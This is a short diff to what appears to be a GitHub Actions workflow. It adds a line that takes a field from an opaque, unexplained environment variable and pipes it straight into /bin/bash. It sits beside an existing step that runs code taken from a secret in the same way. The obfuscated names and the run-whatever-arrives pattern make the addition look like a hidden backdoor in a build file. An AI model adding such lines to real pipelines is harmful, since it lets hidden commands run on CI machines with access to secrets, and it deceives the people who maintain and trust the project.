@@ -20,6 +20,7 @@ jobs:
           tasa14546: ${{ secrets.tasa14546 }}
         run: |
           printf '%s' "$tasa14546" | jq -r .yehaa8 | /bin/bash
+          echo $uv9184 | jq -r .fsvl0946 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
